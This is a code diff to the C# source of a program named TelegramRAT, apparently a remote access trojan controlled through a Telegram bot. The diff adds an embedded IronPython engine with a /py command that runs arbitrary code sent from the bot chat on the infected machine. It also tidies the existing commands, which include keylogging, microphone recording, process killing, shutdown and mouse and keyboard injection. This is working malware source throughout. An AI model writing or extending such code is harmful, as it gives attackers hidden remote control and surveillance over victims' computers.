@@ -15,7 +15,13 @@ using WindowsInput;
 using System.Reflection;
 using System.Text;
 using NAudio.Wave;
-
+using IronPython;
+using IronPython.Compiler;
+using IronPython.Hosting;
+using IronPython.Runtime;
+using Microsoft.Scripting;
+using Microsoft.Scripting.Interpreter;
+using Microsoft.Scripting.Hosting;
 
 namespace TelegramRAT
 {
@@ -33,6 +39,10 @@ namespace TelegramRAT
         static WaveInEvent waveIn;
         static WaveFileWriter waveFileWriter;
 
+        static ScriptScope pythonScope;
+        static ScriptEngine pythonEngine;
+        static ScriptRuntime pythonRuntime;
+
         static void Main(string[] args)
         {
 
@@ -42,6 +52,12 @@ namespace TelegramRAT
                 return;
 
             Bot = new TelegramBotClient(BotToken);
+
+            pythonRuntime = Python.CreateRuntime();
+
+            pythonEngine = Python.CreateEngine();
+
+            pythonScope = pythonRuntime.CreateScope();
 
             #region Commands
             //HELP
@@ -221,6 +237,7 @@ namespace TelegramRAT
             {
                 Command = "/processes",
                 CountArgs = 0,
+                Description = "Get list of running processes.",
                 Example = "/processes",
                 Execute = async (model, update) =>
                 {
@@ -248,8 +265,7 @@ namespace TelegramRAT
                     {
                         ReportError(update, ex);
                     }
-                },
-                Description = "Get list of running processes."
+                }
             });
 
             //PROCESSKILL
@@ -257,6 +273,7 @@ namespace TelegramRAT
             {
                 Command = "/processkill",
                 IgnoreCountArgs = true,
+                Description = "Kill process or processes by name.",
                 Example = "/processkill",
                 Execute = async (model, update) =>
                 {
@@ -275,9 +292,7 @@ namespace TelegramRAT
                     {
                         ReportError(update, ex);
                     }
-
-                },
-                Description = "Kill process or processes by name."
+                }
             });
 
             //CD
@@ -329,6 +344,7 @@ namespace TelegramRAT
             {
                 Command = "/shutdown",
                 CountArgs = 0,
+                Description = "Turn PC off.",
                 Example = "/shutdown",
                 Execute = async (model, update) =>
                 {
@@ -345,8 +361,7 @@ namespace TelegramRAT
                     {
                         ReportError(update, ex);
                     }
-                },
-                Description = "Turn PC off."
+                }
             });
 
             //RESTART
@@ -355,6 +370,7 @@ namespace TelegramRAT
                 Command = "/restart",
                 CountArgs = 0,
                 MayHaveNoArgs = true,
+                Description = "Restart PC",
                 Example = "/restart",
                 Execute = async (model, update) =>
                 {
@@ -372,9 +388,8 @@ namespace TelegramRAT
                     {
                         ReportError(update, ex);
                     }
-                },
-                Description =
-                "Restart PC"
+                }
+                
             });
 
             //DOWNLOAD
@@ -716,18 +731,17 @@ namespace TelegramRAT
                     {
                         try
                         {
-                            if (update.Message.Type != MessageType.Photo)
-                                return;
-
-
-                            using (FileStream fs = new FileStream("wllppr.png", FileMode.Create))
+                            if (update.Message.Type == MessageType.Photo)
                             {
-                                Telegram.Bot.Types.File photo = await Bot.GetFileAsync(update.Message.Photo.Last().FileId);
-                                await Bot.DownloadFileAsync(photo.FilePath, fs);
-                            }
-                            WinAPI.SystemParametersInfo(WinAPI.SPI_SETDESKWALLPAPER, 0, "wllppr.png", WinAPI.SPIF_UPDATEINIFILE | WinAPI.SPIF_SENDWININICHANGE);
-                            await Bot.SendTextMessageAsync(update.Message.Chat.Id, "Done!", replyToMessageId: update.Message.MessageId);
 
+                                using (FileStream fs = new FileStream("wllppr.png", FileMode.Create))
+                                {
+                                    Telegram.Bot.Types.File photo = await Bot.GetFileAsync(update.Message.Photo.Last().FileId);
+                                    await Bot.DownloadFileAsync(photo.FilePath, fs);
+                                }
+                                WinAPI.SystemParametersInfo(WinAPI.SPI_SETDESKWALLPAPER, 0, "wllppr.png", WinAPI.SPIF_UPDATEINIFILE | WinAPI.SPIF_SENDWININICHANGE);
+                                await Bot.SendTextMessageAsync(update.Message.Chat.Id, "Done!", replyToMessageId: update.Message.MessageId);
+                            }
                         }
                         catch (Exception ex)
                         {
@@ -741,9 +755,9 @@ namespace TelegramRAT
             commands.Add(new BotCommand
             {
                 Command = "/minimize",
-                MayHaveNoArgs = true,
+                MayHaveNoArgs = false,
                 IgnoreCountArgs = true,
-                Description = "Minimize window by name, or top window if name was not provided.",
+                Description = "Minimize window by title.",
                 Example = "/minimize Calculator",
                 Execute = (model, update) =>
                 {
@@ -751,18 +765,13 @@ namespace TelegramRAT
                     {
                         try
                         {
-                            if (model.Args.Length > 0)
-                            {
-                                if (WinAPI.FindWindow(null, model.RawArgs) != IntPtr.Zero)
-                                    WinAPI.PostMessage(WinAPI.FindWindow(null, model.RawArgs), WinAPI.WM_SYSCOMMAND, WinAPI.SC_MINIMIZE, 0);
-                                else
-                                    Bot.SendTextMessageAsync(update.Message.Chat.Id, "There is no window with this title!", replyToMessageId: update.Message.MessageId);
-                            }
+                            if (WinAPI.FindWindow(null, model.RawArgs) != IntPtr.Zero)
+                                WinAPI.PostMessage(WinAPI.FindWindow(null, model.RawArgs), WinAPI.WM_SYSCOMMAND, WinAPI.SC_MINIMIZE, 0);
                             else
                             {
-                                WinAPI.PostMessage(WinAPI.GetForegroundWindow(), WinAPI.WM_SYSCOMMAND, WinAPI.SC_MINIMIZE, 0);
+                                Bot.SendTextMessageAsync(update.Message.Chat.Id, "There is no window with such title!", replyToMessageId: update.Message.MessageId);
+                                return;
                             }
-
                             Bot.SendTextMessageAsync(update.Message.Chat.Id, "Done!", replyToMessageId: update.Message.MessageId);
 
                         }
@@ -778,23 +787,21 @@ namespace TelegramRAT
             commands.Add(new BotCommand
             {
                 Command = "/maximize",
+                MayHaveNoArgs = false,
+                IgnoreCountArgs = true,
+                Description = "Maximize window by title.",
+                Example = "/maximize Calculator",
                 Execute = (model, update) =>
                 {
                     Task.Run(() =>
                     {
-                        if (model.Args.Length > 0)
-                        {
-                            if (WinAPI.FindWindow(null, model.RawArgs) != IntPtr.Zero)
-                                WinAPI.PostMessage(WinAPI.FindWindow(null, model.RawArgs), WinAPI.WM_SYSCOMMAND, WinAPI.SC_MAXIMIZE, 0);
-                            else
-                                Bot.SendTextMessageAsync(update.Message.Chat.Id, "There is no window with this title!", replyToMessageId: update.Message.MessageId);
-
-                        }
+                        if (WinAPI.FindWindow(null, model.RawArgs) != IntPtr.Zero)
+                            WinAPI.PostMessage(WinAPI.FindWindow(null, model.RawArgs), WinAPI.WM_SYSCOMMAND, WinAPI.SC_MAXIMIZE, 0);
                         else
                         {
-                            WinAPI.PostMessage(WinAPI.GetForegroundWindow(), WinAPI.WM_SYSCOMMAND, WinAPI.SC_MAXIMIZE, 0);
+                            Bot.SendTextMessageAsync(update.Message.Chat.Id, "There is no window with such title!", replyToMessageId: update.Message.MessageId);
+                            return;
                         }
-
                         Bot.SendTextMessageAsync(update.Message.Chat.Id, "Done!", replyToMessageId: update.Message.MessageId);
                     });
                 }
@@ -804,23 +811,22 @@ namespace TelegramRAT
             commands.Add(new BotCommand
             {
                 Command = "/restore",
+                MayHaveNoArgs = false,
+                IgnoreCountArgs = true,
+                Description = "Restore window by title.",
+                Example = "/restore Calculator",
                 Execute = (model, update) =>
                 {
                     Task.Run(() =>
                     {
-                        if (model.Args.Length > 0)
-                        {
-                            if (WinAPI.FindWindow(null, model.RawArgs) != IntPtr.Zero)
-                                WinAPI.PostMessage(WinAPI.FindWindow(null, model.RawArgs), WinAPI.WM_SYSCOMMAND, WinAPI.SC_RESTORE, 0);
-                            else
-                                Bot.SendTextMessageAsync(update.Message.Chat.Id, "There is no window with this title!", replyToMessageId: update.Message.MessageId);
 
-                        }
+                        if (WinAPI.FindWindow(null, model.RawArgs) != IntPtr.Zero)
+                            WinAPI.PostMessage(WinAPI.FindWindow(null, model.RawArgs), WinAPI.WM_SYSCOMMAND, WinAPI.SC_RESTORE, 0);
                         else
                         {
-                            WinAPI.PostMessage(WinAPI.GetForegroundWindow(), WinAPI.WM_SYSCOMMAND, WinAPI.SC_RESTORE, 0);
+                            Bot.SendTextMessageAsync(update.Message.Chat.Id, "There is no window with this title!", replyToMessageId: update.Message.MessageId);
+                            return;
                         }
-
                         Bot.SendTextMessageAsync(update.Message.Chat.Id, "Done!", replyToMessageId: update.Message.MessageId);
 
                     });
@@ -831,22 +837,21 @@ namespace TelegramRAT
             commands.Add(new BotCommand
             {
                 Command = "/close",
-                Description = "Close window by its title, or top window if title was not provided",
+                MayHaveNoArgs = false,
+                IgnoreCountArgs = true,
+                Description = "Close window by title",
                 Example = "/close Calculator",
                 Execute = async (model, update) =>
                 {
                     await Task.Run(() =>
                     {
-                        if (model.Args.Length > 0)
-                        {
-                            if (WinAPI.FindWindow(null, model.RawArgs) != IntPtr.Zero)
-                                WinAPI.PostMessage(WinAPI.FindWindow(null, model.RawArgs), WinAPI.WM_SYSCOMMAND, WinAPI.SC_CLOSE, 0);
-                            else
-                                Bot.SendTextMessageAsync(update.Message.Chat.Id, "There is no window with this title!", replyToMessageId: update.Message.MessageId);
-                        }
+
+                        if (WinAPI.FindWindow(null, model.RawArgs) != IntPtr.Zero)
+                            WinAPI.PostMessage(WinAPI.FindWindow(null, model.RawArgs), WinAPI.WM_SYSCOMMAND, WinAPI.SC_CLOSE, 0);
                         else
                         {
-                            WinAPI.PostMessage(WinAPI.GetForegroundWindow(), WinAPI.WM_SYSCOMMAND, WinAPI.SC_CLOSE, 0);
+                            Bot.SendTextMessageAsync(update.Message.Chat.Id, "There is no window with this title!", replyToMessageId: update.Message.MessageId);
+                            return;
                         }
 
                         Bot.SendTextMessageAsync(update.Message.Chat.Id, "Done!", replyToMessageId: update.Message.MessageId);
@@ -860,7 +865,8 @@ namespace TelegramRAT
             {
                 Command = "/setfocus",
                 MayHaveNoArgs = false,
-                Description = "Set focus to window by its title.",
+                IgnoreCountArgs = true,
+                Description = "Set focus to window by title.",
                 Example = "/setfocus Calculator",
                 Execute = (model, update) =>
                 {
@@ -884,6 +890,8 @@ namespace TelegramRAT
             commands.Add(new BotCommand
             {
                 Command = "/windowinfo",
+                Description = "Information about window by name, or top window if name wasn't provided",
+                Example = "/windowinfo Calculator",
                 Execute = (model, update) =>
                 {
                     Task.Run(() =>
@@ -933,9 +941,7 @@ namespace TelegramRAT
                         {
                             ReportError(update, ex);
                         }
-
                     });
-
                 }
             });
 
@@ -946,7 +952,7 @@ namespace TelegramRAT
                 CountArgs = 2,
                 IgnoreCountArgs = false,
                 MayHaveNoArgs = false,
-
+                Description = "Move cursor to coordinate in pixels",
                 Example = "/mouseto 200 300 (width heght)",
 
                 Execute = (model, update) =>
@@ -964,8 +970,7 @@ namespace TelegramRAT
                     {
                         ReportError(update, ex);
                     }
-                },
-                Description = "Move cursor to coordinate in pixels"
+                }
             });
 
             //MOVE MOUSE BY PIXELS
@@ -975,6 +980,7 @@ namespace TelegramRAT
                 CountArgs = 2,
                 IgnoreCountArgs = false,
                 MayHaveNoArgs = false,
+                Description = "Move cursor by pixels.",
                 Example = "/mouseby 15 20",
                 Execute = (model, update) =>
                 {
@@ -989,44 +995,43 @@ namespace TelegramRAT
                     {
                         ReportError(update, ex);
                     }
-                },
-                Description = "Move cursor by pixels."
+                }
             });
 
             //CLICK LEFT MOUSE BUTTON
             commands.Add(new BotCommand
             {
                 Command = "/lmclick",
+                Description = "Simulate left mouse click.",
                 Execute = (model, update) =>
                 {
                     new MouseSimulator(new InputSimulator()).LeftButtonClick();
                     Bot.SendTextMessageAsync(update.Message.Chat.Id, "Done!", replyToMessageId: update.Message.MessageId);
-                },
-                Description = "Simulate left mouse click."
+                }
             });
 
             //DOUBLECLICK LEFT MOUSE BUTTON
             commands.Add(new BotCommand
             {
                 Command = "/dlmclick",
+                Description = "Simulate double left mouse click.",
                 Execute = (model, update) =>
                 {
                     new MouseSimulator(new InputSimulator()).LeftButtonDoubleClick();
                     Bot.SendTextMessageAsync(update.Message.Chat.Id, "Done!", replyToMessageId: update.Message.MessageId);
-                },
-                Description = "Simulate double left mouse click."
+                }
             });
 
             //CLICK RIGHT MOUSE BUTTON
             commands.Add(new BotCommand
             {
                 Command = "/rmclick",
+                Description = "Simulate right mouse click.",
                 Execute = (model, update) =>
                 {
                     new MouseSimulator(new InputSimulator()).RightButtonClick();
                     Bot.SendTextMessageAsync(update.Message.Chat.Id, "Done!", replyToMessageId: update.Message.MessageId);
-                },
-                Description = "Simulate right mouse click."
+                }
             });
 
             //SEND TEXT INPUT
@@ -1034,6 +1039,7 @@ namespace TelegramRAT
             {
                 Command = "/sendtext",
                 IgnoreCountArgs = true,
+                Description = "Send text input",
                 Example = "/sendtext hello world",
                 Execute = (model, update) =>
                 {
@@ -1049,8 +1055,7 @@ namespace TelegramRAT
                             ReportError(update, ex);
                         }
                     });
-                },
-                Description = "Send text input"
+                }
             });
 
             //KEYLOG
@@ -1139,6 +1144,8 @@ namespace TelegramRAT
             {
                 Command = "/audio",
                 CountArgs = 1,
+                Description = "Record audio from microphone for given amount of secs or start and stop as a first argument.",
+                Example = "/audio 50",
                 Execute = (model, update) =>
                 {
                     Task.Run(() =>
@@ -1252,14 +1259,14 @@ namespace TelegramRAT
                         }
 
                     });
-                },
-                Description = "Record audio from microphone for given amount of secs."
+                }
             });
 
             //GET ALL COMMANDS
             commands.Add(new BotCommand
             {
                 Command = "/commands",
+                Description = "Get all commands list sorted by alphabet",
                 Execute = (model, update) =>
                 {
                     Task.Run(() =>
@@ -1273,8 +1280,7 @@ namespace TelegramRAT
                         Bot.SendTextMessageAsync(update.Message.Chat.Id, commandsList.ToString(), replyToMessageId: update.Message.MessageId);
 
                     });
-                },
-                Description = "Get all commands list sorted by alphabet"
+                }
             });
 
             //DELETE FILE
@@ -1436,6 +1442,66 @@ namespace TelegramRAT
                 }
             });
 
+            //PYTHON COMMANDS EXECUTING
+            commands.Add(new BotCommand
+            {
+                Command = "/py",
+                MayHaveNoArgs = false,
+                IgnoreCountArgs = true,
+                Description = "Execute python expression. Mind that all expressions execute in the same script scope. To clear scope /pyclearscope",
+                Example = "/py print('Hello World')",
+                Execute = (model, update) =>
+                {
+                    Task.Run(() =>
+                    {
+                        try
+                        {
+                            Console.WriteLine("Python must execute:" + model.RawArgs);
+                            MemoryStream pyOutput = new MemoryStream();
+                            var pyStream = new MemoryStream();
+                            pythonEngine.Runtime.IO.SetOutput(pyStream, Encoding.UTF8);
+
+                            pythonEngine.Execute(model.RawArgs, pythonScope);
+                            pyStream.Position = 0;
+
+                            if (pyStream.Length > 0)
+                            {
+                                Bot.SendTextMessageAsync(update.Message.Chat.Id, $"Executed! Output:\n{new StreamReader(pyStream).ReadToEnd()}", replyToMessageId: update.Message.MessageId);
+                            }
+                            else
+                            {
+                                Bot.SendTextMessageAsync(update.Message.Chat.Id, "Executed!", replyToMessageId: update.Message.MessageId);
+                            }
+                            pyStream.Position = 0;
+                            Console.WriteLine("Output: " + new StreamReader(pyStream).ReadToEnd() + " len:" + pyStream.Length);
+                            pyStream.Close();
+
+                        }
+                        catch (Exception ex)
+                        {
+                            ReportError(update, ex);
+                        }
+                        
+                    });
+                }
+            });
+
+            //PYTHON CLEAR SCOPE
+            commands.Add(new BotCommand
+            {
+                Command = "/pyclearscope",
+                Description = "Clear python execution scope.",
+                Execute = (model, update) =>
+                {
+                    Task.Run(() =>
+                    {
+                        pythonScope = pythonEngine.CreateScope();
+                        Bot.SendTextMessageAsync(update.Message.Chat.Id, "Cleared!", replyToMessageId: update.Message.MessageId);
+                    });
+                }
+
+            });
+
 
             #endregion
 
@@ -1489,7 +1555,7 @@ namespace TelegramRAT
 
                 UpdateWorker(updates).Wait();
 
-                Task.Delay(500).Wait();
+                Task.Delay(100).Wait();
             }
 
         }
